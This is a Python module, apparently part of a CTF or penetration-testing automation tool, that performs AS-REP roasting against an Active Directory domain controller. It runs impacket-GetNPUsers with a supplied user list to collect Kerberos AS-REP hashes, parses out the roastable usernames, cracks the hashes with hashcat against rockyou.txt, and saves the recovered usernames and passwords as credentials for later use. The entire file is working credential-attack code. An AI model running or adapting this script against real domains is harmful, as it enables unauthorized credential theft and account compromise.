def asreproast(
    data,
    cred,
    args,
    artifact_dir
):

    from pathlib import Path
    from datetime import datetime
    import subprocess
    from core.target import target_add_cred
    import argparse
    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    target = data.get("ip")
    domain = data.get("domain")

    if not target or not domain:

        print(
            f"\n{R}[!] {W}Missing target/domain\n"
        )

        return []

    #
    # USERLIST
    #

    if getattr(args, "extra", None):

        users_file = Path(
            args.extra[0]
        ).expanduser().resolve()

    else:

        users_file = (
            artifact_dir /
            "users.txt"
        )

    if not users_file.exists():

        print(
            f"\n{R}[!] {W}User list not found\n"
        )

        print(
            f"{B}Run:{W} "
            f"{Y}ctf ad.users{W}"
        )

        print(
            f"{B}Or:{W} "
            f"{Y}ctf ad.asreproast users.txt{W}\n"
        )

        return []

    #
    # ARTIFACTS
    #

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    hashes_file = (
        artifact_dir /
        "asrep_hashes.txt"
    )

    cracked_file = (
        artifact_dir /
        "asrep_cracked.txt"
    )

    logfile = (
        artifact_dir /
        f"asreproast_{timestamp}.log"
    )

    #
    # HUD
    #

    user_count = len(
        users_file.read_text(
            errors="ignore"
        ).splitlines()
    )

    print(
        f"\n{B}┌── {BOLD}MODULE: AS-REP ROAST{W}{B} ──────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Domain:{W} "
        f"{C}{domain:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}DC:{W}     "
        f"{C}{target:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Users:{W}  "
        f"{C}{str(user_count):<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└──────────────────────────────────────┘{W}"
    )

    #
    # GETNPUSERS
    #

    cmd = [
        "impacket-GetNPUsers",
        f"{domain}/",
        "-dc-ip",
        target,
        "-no-pass",
        "-usersfile",
        str(users_file)
    ]

    print(
        f"\n{B}[*]{W} AS-REP Roasting\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    logfile.write_text(
        result.stdout +
        result.stderr
    )

    #
    # PARSE HASHES
    #

    hashes = []
    roastable = []

    for line in result.stdout.splitlines():

        if "$krb5asrep$" not in line:
            continue

        hashes.append(
            line.strip()
        )

        try:

            username = (
                line.split("$")[3]
                .split("@")[0]
            )

            roastable.append(
                username
            )

        except Exception:

            pass

    if not hashes:

        print(
            f"\n{Y}[-]{W} No AS-REP roastable users found\n"
        )

        return []

    hashes_file.write_text(
        "\n".join(hashes)
    )

    #
    # ROASTABLE USERS
    #

    print(
        f"\n{G}[+] {W}Roastable Users\n"
    )

    for user in sorted(
        set(roastable)
    ):

        print(
            f"  {B}├──{W} "
            f"{C}{user}{W}"
        )

    #
    # HASHCAT
    #

    rockyou = Path(
        "/usr/share/wordlists/rockyou.txt"
    )

    if rockyou.exists():

        print(
            f"\n{B}[*]{W} Cracking with rockyou.txt\n"
        )

        crack_cmd = [
            "hashcat",
            "-m",
            "18200",
            str(hashes_file),
            str(rockyou),
            "--quiet",
            "--outfile",
            str(cracked_file)
        ]
        print(f"{Y}{' '.join(crack_cmd)}{W}\n")

        subprocess.run(
            crack_cmd
        )

        if cracked_file.exists():

            cracked_creds = []
            seen = set()

            for line in cracked_file.read_text(
                errors="ignore"
            ).splitlines():

                if ":" not in line:
                    continue

                try:

                    password = (
                        line.rsplit(
                            ":",
                            1
                        )[1]
                    )

                    username = (
                        line.split(
                            "$"
                        )[3]
                        .split(
                            "@"
                        )[0]
                    )

                    key = (
                        username,
                        password
                    )

                    if key in seen:
                        continue

                    seen.add(
                        key
                    )

                    cracked_creds.append(
                        {
                            "user": username,
                            "password": password
                        }
                    )

                except Exception:

                    pass

            if cracked_creds:

                print(
                    f"\n{G}[+] {W}Cracked Credentials\n"
                )

                for c in cracked_creds:

                    print(
                        f"  {B}├──{W} "
                        f"{C}{c['user']}{W}:"
                        f"{Y}{c['password']}{W}"
                    )

                    target_add_cred(
                        argparse.Namespace(
                            user=c["user"],
                            password=c["password"],
                            hash=None,
                            aes=None,
                            ccache=None
                        )
                    )

    #
    # OUTPUT
    #

    print()

    print(
        f"{G}[+] {W}Artifacts"
    )

    print(
        f"{B}  ├── {C}{hashes_file}{W}"
    )

    print(
        f"{B}  ├── {C}{cracked_file}{W}"
    )

    print(
        f"{B}  └── {C}{logfile}{W}\n"
    )

    return roastable


from pathlib import Path

from core.paths import get_chain_artifacts_dir

def run(
    data,
    cred,
    args
):

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    if not data.get("ip"):

        print(
            f"\n{R}[!] {W}{BOLD}NO TARGET SELECTED{W}\n"
        )

        return data

    artifact_dir = get_chain_artifacts_dir(
        data["name"],
        "ad"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    try:

        users = asreproast(
            data,
            cred,
            args,
            artifact_dir
        )

        if users:

            data["asrep_users"] = users

    except Exception as e:

        print(
            f"\n{R}[-]{W} asreproast: "
            f"{e}\n"
        )

    return data